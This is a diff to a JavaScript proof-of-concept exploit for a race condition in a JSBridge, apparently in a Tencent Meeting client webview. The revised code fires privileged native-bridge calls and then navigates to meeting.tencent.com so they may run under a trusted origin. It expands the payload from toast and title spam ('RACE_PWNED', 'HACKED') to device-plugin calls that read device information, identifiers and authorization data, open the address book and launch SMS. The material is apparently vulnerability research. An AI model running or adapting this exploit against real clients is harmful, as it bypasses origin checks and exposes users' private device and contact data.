@@ -29,29 +29,36 @@ function doRace() {
     addLog('=== ShowToast Race PoC ===');
     addLog('URL: ' + location.href);
 
-    // 批量发送 ShowToast（带明显标识文字）
-    for (var i = 0; i < 20; i++) {
-        callJSBridge('UIPlugin', 'ShowToast', {
-            content: 'RACE_PWNED_' + i,
-            duration: 5000,
-            type: 0
-        });
-    }
-    addLog('Sent 20x ShowToast');
+    // DevicePlugin 全部 method
+    var methods = [
+        ['DevicePlugin', 'GetClientInfo', {}],
+        ['DevicePlugin', 'GetDeviceInfo', {}],
+        ['DevicePlugin', 'GetQimei36', {}],
+        ['DevicePlugin', 'CheckUpgrade', {}],
+        ['DevicePlugin', 'GetAuthorizationInfo', {}],
+        ['DevicePlugin', 'RequestAuthorization', {scope: 'scope.userInfo'}],
+        ['DevicePlugin', 'IsSupportPendant', {}],
+        ['DevicePlugin', 'ToggleRingingAudio', {}],
+        ['DevicePlugin', 'OpenAddressBook', {}],
+        ['DevicePlugin', 'RotateScreen', {orientation: 1}],
+        ['DevicePlugin', 'SetScreenRotateEnable', {enable: true}],
+        ['DevicePlugin', 'GetScreenOrientation', {}],
+        ['DevicePlugin', 'Vibrate', {}],
+        ['DevicePlugin', 'ScanQrcode', {}],
+        ['DevicePlugin', 'LaunchSendSMS', {}],
+        ['UIPlugin', 'ShowToast', {content: 'RACE_PWNED', duration: 5000, type: 0}],
+        ['CommonPlugin', 'SetTitle', {title: 'HACKED'}],
+    ];
 
-    // 也发 SetTitle
-    for (var i = 0; i < 10; i++) {
-        callJSBridge('CommonPlugin', 'SetTitle', {
-            title: 'HACKED_BY_RACE_' + i
-        });
+    for (var i = 0; i < methods.length; i++) {
+        callJSBridge(methods[i][0], methods[i][1], methods[i][2]);
     }
-    addLog('Sent 10x SetTitle');
+    addLog('Sent ' + methods.length + ' calls (DevicePlugin + ShowToast + SetTitle)');
 
-    // 延迟 2s 确认 IPC 已到达主进程（此时应该看到 DENY）
-    // 然后再 navigate
-    addLog('Waiting 2s for IPC to arrive at main process...');
+    // 延迟 2s 让 IPC 到达主进程
+    addLog('Waiting 2s...');
     setTimeout(function() {
-        addLog('Now navigating to meeting.tencent.com...');
+        addLog('Navigating to meeting.tencent.com...');
         window.location.href = 'https://meeting.tencent.com/';
     }, 2000);
 }
